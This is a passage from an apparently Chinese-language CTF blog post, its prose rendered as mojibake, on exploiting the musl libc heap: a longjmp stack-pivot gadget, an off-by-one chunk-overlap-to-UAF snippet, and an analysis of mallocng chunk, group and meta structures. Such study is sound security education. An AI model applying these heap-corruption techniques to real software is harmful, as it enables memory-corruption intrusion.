          <a href="#æ–¹æ³•ä¸‰ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æ–¹æ³•ä¸‰ï¼š" class="headerlink" title="æ–¹æ³•ä¸‰ï¼š"></a>æ–¹æ³•ä¸‰ï¼š</h5>
      <p>åŒæ ·çš„ï¼Œå¦‚æœæ˜¯ORWï¼Œå†è¿›ä¸€æ­¥çš„è¯ï¼Œæ˜¯ä¸æ˜¯muslä¸­ä¹Ÿå­˜åœ¨ç±»ä¼¼äºsetcontextä¹‹ç±»å¯ä»¥ç”šè‡³æ ˆçš„gadgetå‘¢ï¼Œå…¶å®æ˜¯æœ‰çš„ï¼Œåœ¨<code>longjmp</code>å‡½æ•°ä¸­ï¼Œ</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//1.1.24çš„libcä¸­</span><br><span class="line">.text:0000000000048B96                 mov     rdx, [rdi+30h]</span><br><span class="line">.text:0000000000048B9A                 mov     rsp, rdx</span><br><span class="line">.text:0000000000048B9D                 mov     rdx, [rdi+38h]</span><br><span class="line">.text:0000000000048BA1                 jmp     rdx</span><br></pre></td></tr></table></div></figure>

<p>ç›¸å¯¹åº”åœ¨1.2.0ä»¥ä¸Šç‰ˆæœ¬ä¸­ä¹Ÿæ˜¯æœ‰ç±»ä¼¼çš„ï¼Œä¹Ÿåœ¨<code>longjmp</code>å‡½æ•°ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°†<code>__stdin_used</code>åŠ«æŒä¸ºå †åœ°å€ï¼Œåœ¨å †ä¸Šå¸ƒç½®ä¸‹æˆ‘ä»¬çš„ORWæ¥è¿›è¡Œæ”»å‡»</p>

        <h4 id="â‘¡off-by-one"   >
          <a href="#â‘¡off-by-one" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡off-by-one" class="headerlink" title="â‘¡off-by-one"></a>â‘¡off-by-one</h4>
      <p>ä¸€èˆ¬åœ¨Muslç¯å¢ƒä¸‹çš„å †é¢˜ï¼ŒåŸºæœ¬ä¸å­˜åœ¨off-by-nullçš„æƒ…å†µçš„ï¼Œå› ä¸ºå½“å‰chunkçš„csizeä¼šå’Œä¸‹ä¸€ä¸ªchunkçš„psizeè¿›è¡Œæ¯”å¯¹ï¼Œå¦‚æœä¸ç­‰ä¼šcrashã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//__bin_chunkå‡½æ•°ä¸­</span></span><br><span class="line"><span class="comment">//è‹¥ä¸‹ä¸€ä¸ª chunk çš„ psize ä¸ç­‰äº self çš„ csizeï¼Œåˆ™ crash</span></span><br><span class="line">    <span class="comment">//ç›¸å½“äºæ£€æµ‹pre_sizeå’Œsize</span></span><br><span class="line">	<span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br></pre></td></tr></table></div></figure>

<p>è€Œç”±äºä¸é‡ç”¨psizeå­—æ®µï¼Œå°±ç®—æº¢å‡ºä¸€ä¸ªé›¶å­—èŠ‚ï¼Œä¹Ÿæ— æ³•è¦†ç›–åˆ°csizeå­—æ®µï¼Œåªèƒ½è¦†ç›–åˆ°pszieå­—æ®µï¼Œæ‰€ä»¥å½“å¯ä»¥æº¢å‡ºä¸€ä¸ªä»»æ„å­—èŠ‚æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹psizeå­—æ®µï¼Œå‘ä¸Šè¿›è¡Œå †å—é‡å åˆå¹¶ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add_malloc(<span class="number">0x40</span>-<span class="number">0x10</span>)</span><br><span class="line">add_malloc(<span class="number">0x40</span>-<span class="number">0x10</span>)</span><br><span class="line">add_malloc(<span class="number">0x40</span>-<span class="number">0x10</span>)</span><br><span class="line">add_malloc(<span class="number">0x40</span>-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">1</span>,(<span class="number">0x40</span>-<span class="number">0x10</span>+<span class="number">0x1</span>),<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x10</span>)+p8(<span class="number">0x80</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·chunk0å’Œchunk1å°±ä¼šåˆå¹¶åˆ°ä¸€å—è¿›å…¥binä¸­ï¼Œåˆ¶é€ chunk1çš„å †å—é‡å ï¼Œä½†æ˜¯ç”±äºå‡½æ•°æœºåˆ¶é—®é¢˜ï¼Œchunk2å®é™…ä¸Šæ˜¯å¹¶æ²¡æœ‰è¢«é‡Šæ”¾åˆ°binä¸­çš„ã€‚</p>

        <h5 id="æœªåˆå¹¶å‰å¦‚ä¸‹ï¼š"   >
          <a href="#æœªåˆå¹¶å‰å¦‚ä¸‹ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#æœªåˆå¹¶å‰å¦‚ä¸‹ï¼š" class="headerlink" title="æœªåˆå¹¶å‰å¦‚ä¸‹ï¼š"></a>æœªåˆå¹¶å‰å¦‚ä¸‹ï¼š</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181131379.png" alt="image-20220218113100251"></p>

        <h5 id="åˆå¹¶åå¦‚ä¸‹ï¼š"   >
          <a href="#åˆå¹¶åå¦‚ä¸‹ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#åˆå¹¶åå¦‚ä¸‹ï¼š" class="headerlink" title="åˆå¹¶åå¦‚ä¸‹ï¼š"></a>åˆå¹¶åå¦‚ä¸‹ï¼š</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181136514.png" alt="image-20220218113620389"></p>
<p>é‚£ä¹ˆä¹‹åå°†chunk1é‡Šæ”¾ï¼Œåœ¨å°†chunk0+chunk1ç”³è¯·å›æ¥ï¼Œå³å¯åˆ¶é€ ä¸€ä¸ªUAFäº†ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>,(<span class="number">0x40</span>-<span class="number">0x10</span>+<span class="number">0x1</span>),<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x10</span>)+p8(<span class="number">0x41</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add_malloc(<span class="number">0x80</span>-<span class="number">0x10</span>)</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹æ‰€ç¤º</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181204446.png" alt="image-20220218120440262"></p>
<p>æœ‰äº†UAFä¹‹åå°±å¥½åŠå¾ˆå¤šäº†ï¼Œè¿˜æ˜¯å‚è€ƒä¸Šè¿°çš„UAFæƒ…å†µ</p>

        <h1 id="äºŒã€1-2-1åŠä¹‹åç‰ˆæœ¬"   >
          <a href="#äºŒã€1-2-1åŠä¹‹åç‰ˆæœ¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€1-2-1åŠä¹‹åç‰ˆæœ¬" class="headerlink" title="äºŒã€1.2.1åŠä¹‹åç‰ˆæœ¬"></a>äºŒã€1.2.1åŠä¹‹åç‰ˆæœ¬</h1>
      <p>è¿™ä¸ªç‰ˆæœ¬ä¸‹çš„å †ç®¡ç†æ–¹å¼æœ‰äº†å¾ˆå¤§çš„å˜åŒ–ï¼Œå¯ä»¥è¯´å’ŒåŸæ¥çš„éƒ½ä¸æ˜¯ä¸€ä¸ªä¸œè¥¿äº†ã€‚</p>
<p>å‚è€ƒ</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252293" >æ–°ç‰ˆmusl-libc mallocæºç åˆ†æä¸è°ƒè¯• - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253566#h3-2" >ä»musl libc 1.1.24åˆ°1.2.2 å­¦ä¹ pwnå§¿åŠ¿ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246929" >musl-1.2.xå †éƒ¨åˆ†æºç åˆ†æ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-æ•°æ®ç»“æ„-1"   >
          <a href="#1-æ•°æ®ç»“æ„-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ•°æ®ç»“æ„-1" class="headerlink" title="1.æ•°æ®ç»“æ„"></a>1.æ•°æ®ç»“æ„</h2>
      
        <h3 id="1-chunkç»“æ„-1"   >
          <a href="#1-chunkç»“æ„-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-chunkç»“æ„-1" class="headerlink" title="(1)chunkç»“æ„"></a>(1)chunkç»“æ„</h3>
      <p>åœ¨è¯¥ç‰ˆæœ¬ä¹‹åï¼Œå¹¶æ²¡æœ‰åƒä¹‹å‰ä¸€æ ·å°†chunkç»“æ„å®šä¹‰åœ¨ä»£ç é‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½è‡ªå·±æ¥è¿›è¡ŒçŒœæµ‹ï¼Œå¤§è‡´å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> res;        <span class="comment">// ä¿ç•™,ä¸€ç›´ä¸º\x00</span></span><br><span class="line">    <span class="keyword">uint8_t</span> idx:<span class="number">5</span>;      </span><br><span class="line">    <span class="comment">//ä½5bitä½œä¸ºidxè¡¨ç¤ºè¿™æ˜¯groupä¸­ç¬¬å‡ ä¸ªchunk, é«˜3bitä½œä¸ºreserved</span></span><br><span class="line">    <span class="comment">//å¦‚æœè¯¥chunkè¢«freeï¼Œåˆ™è¯¥å­—èŠ‚è¢«ç½®ä¸º0xff,åŒæ—¶ä¸‹é¢çš„offsetè¢«ç½®ä¸º0</span></span><br><span class="line">    <span class="keyword">uint8_t</span> reserved:<span class="number">3</span>;  <span class="comment">// ä¸çŸ¥é“å¹²å•¥çš„</span></span><br><span class="line">    <span class="keyword">uint16_t</span> offset;     <span class="comment">//ä¸ç¬¬ä¸€ä¸ªchunkçš„åç§»</span></span><br><span class="line">    					<span class="comment">//å¦‚æœä¸º4åˆ™chunk_addr-0x40=first_chunk_addr</span></span><br><span class="line">    <span class="comment">/*å¦‚æœæ˜¯groupä¸­çš„ç¬¬ä¸€ä¸ªchunkï¼Œé‚£ä¹ˆè¿˜æœ‰å¦‚ä¸‹æ•°æ®</span></span><br><span class="line"><span class="comment">    struct meta* meta;//æŒ‡å‘ç®¡ç†è¯¥groupçš„meta</span></span><br><span class="line"><span class="comment">	unsigned char active_idx:5;//å æ®5bytes,è¡¨ç¤ºè¯¥groupä¸­å…±æœ‰å‡ ä¸ªslot,ä¹Ÿå°±æ˜¯chunk</span></span><br><span class="line"><span class="comment">	char pad[UNIT - sizeof(struct meta *) - 1];</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">char</span> user_data[];    <span class="comment">// æœ€åä¸€å­—èŠ‚éœ€è¦ä¸º\x00</span></span><br><span class="line">    <span class="keyword">char</span> remain_data[];  <span class="comment">// å‰©ä½™ç©ºé—´æœ€åä¸€å­—èŠ‚éœ€è¦ä¸º\x00</span></span><br><span class="line">    <span class="keyword">uint32_t</span> remain_size; <span class="comment">// chunkå‰©ä½™sizeå¤§å°</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œchunkåˆ†å¸ƒå¤§æ¦‚å¦‚ä¸‹</p>
<p><img src="C:/Users/007/Desktop/202203181141533.png" alt="image-20220318114135427"></p>
<p>å…¶ä¸­chunk1çš„idxå³ä¸ºè¯¥groupä¸­çš„ç¬¬1ä¸ªChunkï¼Œä¸º0x1</p>
<p>è€Œè¿™æ•´ç‰‡å¼€è¾Ÿçš„ç©ºé—´ï¼ŒåŒ…æ‹¬æœªè¢«åˆ†é…çš„chunkï¼Œå¦‚ä¸‹é¢çš„é©¬èµ›å…‹éƒ¨åˆ†ä¸”ä¸€ç›´å‘ä¸‹å»¶ç”³åˆ°ä¸€å®šä½ç½®ï¼Œè¿åœ¨ä¸€èµ·å«åš<code>group</code></p>

        <h3 id="2-group"   >
          <a href="#2-group" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-group" class="headerlink" title="(2)group"></a>(2)group</h3>
      <p>ä¹Ÿå°±æ˜¯é€šè¿‡mmapå¼€è¾Ÿå‡ºæ¥ç”¨æ¥å­˜æ”¾chunkçš„ä¸€ç‰‡ç©ºé—´ï¼Œå®šä¹‰å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.1-src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span><span class="comment">//å³ä¸Šå›¾å¤´éƒ¨chunk0ä¸­çš„ç¬¬ä¸€ä¸ªæŒ‡é’ˆåœ°å€</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> active_idx:<span class="number">5</span>;<span class="comment">//å æ®5bytes</span></span><br><span class="line">	<span class="keyword">char</span> pad[UNIT - <span class="keyword">sizeof</span>(struct meta *) - <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> storage[];</span><br><span class="line">    <span class="comment">//å³ä»å¤´éƒ¨chunk0ä»0x41å¼€å§‹ä¸€ç›´å¾€ä¸‹çš„éƒ¨åˆ†ï¼ŒåŒ…æ‹¬chunk1,chunk2..ä»¥åŠæœªè¢«åˆ†é…å‡ºå»çš„Chunk</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>ä¸”groupä¸­å­˜æ”¾çš„Chunkçš„sizeæ˜¯åœ¨ä¸€ä¸ªèŒƒå›´å†…ï¼Œé€šè¿‡å¦‚ä¸‹å®šä¹‰ä»¥åŠè®¡ç®—</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IB 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">    <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">    <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">    <span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">    <span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">    <span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">    <span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">    <span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">    <span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">    <span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">a_ctz_32</span><span class="params">(<span class="keyword">uint32_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> a_clz_32</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">31</span>-a_clz_32(x&amp;-x);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> debruijn32[<span class="number">32</span>] = &#123;</span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="number">29</span>, <span class="number">24</span>, <span class="number">19</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">11</span>, <span class="number">20</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">13</span>,</span><br><span class="line">        <span class="number">31</span>, <span class="number">22</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">26</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">16</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">14</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> debruijn32[(x&amp;-x)*<span class="number">0x076be629</span> &gt;&gt; <span class="number">27</span>];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">a_clz_32</span><span class="params">(<span class="keyword">uint32_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    x &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    x++;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">31</span>-a_ctz_32(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">size_to_class</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n = (n+IB<span class="number">-1</span>)&gt;&gt;<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (n&lt;<span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">    n++;</span><br><span class="line">    <span class="keyword">int</span> i = (<span class="number">28</span>-a_clz_32(n))*<span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (n&gt;size_classes[i+<span class="number">1</span>]) i+=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (n&gt;size_classes[i]) i++;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç›¸å…³æ±‡æ€»è®¡ç®—å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">0x0     ~ 0xc -&gt;0</span><br><span class="line">0xd     ~ 0x1c -&gt;1</span><br><span class="line">0x1d    ~ 0x2c -&gt;2</span><br><span class="line">0x2d    ~ 0x3c -&gt;3</span><br><span class="line">0x3d    ~ 0x4c -&gt;4</span><br><span class="line">0x4d    ~ 0x5c -&gt;5</span><br><span class="line">0x5d    ~ 0x6c -&gt;6</span><br><span class="line">0x6d    ~ 0x7c -&gt;7</span><br><span class="line">0x7d    ~ 0x8c -&gt;8</span><br><span class="line">0x8d    ~ 0x9c -&gt;9</span><br><span class="line">0x9d    ~ 0xbc -&gt;10</span><br><span class="line">0xbd    ~ 0xec -&gt;11</span><br><span class="line">0xed    ~ 0x11c -&gt;12</span><br><span class="line">0x11d   ~ 0x13c -&gt;13</span><br><span class="line">0x13d   ~ 0x18c -&gt;14</span><br><span class="line">0x18d   ~ 0x1ec -&gt;15</span><br><span class="line">0x1ed   ~ 0x23c -&gt;16</span><br><span class="line">0x23d   ~ 0x29c -&gt;17</span><br><span class="line">0x29d   ~ 0x31c -&gt;18</span><br><span class="line">0x31d   ~ 0x3ec -&gt;19</span><br><span class="line">0x3ed   ~ 0x47c -&gt;20</span><br><span class="line">0x47d   ~ 0x53c -&gt;21</span><br><span class="line">0x53d   ~ 0x65c -&gt;22</span><br><span class="line">0x65d   ~ 0x7ec -&gt;23</span><br><span class="line">0x7ed   ~ 0x91c -&gt;24</span><br><span class="line">0x91d   ~ 0xa9c -&gt;25</span><br><span class="line">0xa9d   ~ 0xcbc -&gt;26</span><br><span class="line">0xcbd   ~ 0xfec -&gt;27</span><br><span class="line">0xfed   ~ 0x123c -&gt;28</span><br><span class="line">0x123d  ~ 0x153c -&gt;29</span><br><span class="line">0x153d  ~ 0x198c -&gt;30</span><br><span class="line">0x198d  ~ 0x1fec -&gt;31</span><br><span class="line">0x1fed  ~ 0x247c -&gt;32</span><br><span class="line">0x247d  ~ 0x2a9c -&gt;33</span><br><span class="line">0x2a9d  ~ 0x331c -&gt;34</span><br><span class="line">0x331d  ~ 0x3fec -&gt;35</span><br><span class="line">0x3fed  ~ 0x490c -&gt;36</span><br><span class="line">0x490d  ~ 0x553c -&gt;37</span><br><span class="line">0x553d  ~ 0x664c -&gt;38</span><br><span class="line">0x664d  ~ 0x7fec -&gt;39</span><br><span class="line">0x7fed  ~ 0x923c -&gt;40</span><br><span class="line">0x923d  ~ 0xaa9c -&gt;41</span><br><span class="line">0xaa9d  ~ 0xccbc -&gt;42</span><br><span class="line">0xccbd  ~ 0xffec -&gt;43</span><br><span class="line">0xffed  ~ 0x1247c -&gt;44</span><br><span class="line">0x1247d ~ 0x1553c -&gt;45</span><br><span class="line">0x1553d ~ 0x1997c -&gt;46</span><br></pre></td></tr></table></div></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªgroupä¸­çš„chunkå¤§å°èŒƒå›´è¦ä¹ˆæ˜¯<code>0x0 ~ 0xc </code>ï¼Œè¦ä¹ˆæ˜¯<code>0xd~ 0x1c</code>ï¼Œä¾æ¬¡ç±»æ¨ã€‚ä¸”ä¾æ®ä¸Šè¿°è½¬æ¢è¡¨ï¼Œä¸€ä¸ªèŒƒå›´å¯¹åº”ä¸€ä¸ªç´¢å¼•ï¼Œè¯¥ç´¢å¼•å³ç”¨æ¥å¯»æ‰¾metaçš„ç´¢å¼•ã€‚</p>

        <h3 id="3-meta"   >
          <a href="#3-meta" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-meta" class="headerlink" title="(3)meta"></a>(3)meta</h3>
      <p>è€Œç”¨æ¥ç®¡ç†groupçš„ç»“æ„ç§°ä¸ºmetaï¼Œä¸€ä¸ªmetaå¯¹åº”ä¸€ä¸ªgroupï¼Œè€Œä¸Šé¢ç»“æ„å®šä¹‰ä¸­çš„groupä¸­çš„metaæŒ‡é’ˆå³æŒ‡å‘ç®¡ç†æœ¬groupçš„metaï¼Œå…¶å®šä¹‰å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.1-src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="comment">//å­˜åœ¨å¤šä¸ªmetaï¼Œé€šè¿‡å¾ªç¯åŒå‘é“¾è¡¨ä¸²è”èµ·æ¥</span></span><br><span class="line">    <span class="comment">//é‡Šæ”¾ä¹‹åæœ‰ç”¨,æ²¡æœ‰é‡Šæ”¾çš„åˆ™æŒ‡å‘æœ¬èº«</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">//æŒ‡å‘æœ¬metaç®¡ç†çš„group</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//freed_maskæ˜¯å½“å‰metaçš„groupä¸­è¢«freeçš„chunkçš„bitmap, 4bytes</span></span><br><span class="line">    <span class="comment">//avail_maskæ˜¯å½“å‰metaçš„groupä¸­ç›®å‰å¯ç”¨chunkçš„bitmap, 4bytes</span></span><br><span class="line">   	<span class="comment">//ç”±äºæ˜¯4bytesï¼Œæ€»å…±32bitï¼Œé‚£ä¹ˆæœ€å¤šå¯æœ‰32ä¸ªchunk</span></span><br><span class="line">    <span class="comment">//è¿™é‡Œå¾ˆå¥‡æ€ªå•Šï¼Œç›´æ¥0/1è¡¨ç¤ºå¯ç”¨ä¸å¯ç”¨å‘—ï¼Œé‚£è¦æ˜¯æŸä¸ªchunkåœ¨è¿™ä¸¤ä¸ªfreeå’Œavailçš„bitmap</span></span><br><span class="line">    <span class="comment">//ä¸­å¯¹åº”çš„bitéƒ½ä¸º1æˆ–éƒ½ä¸º0åˆæ€ä¹ˆç®—å‘¢</span></span><br><span class="line">    <span 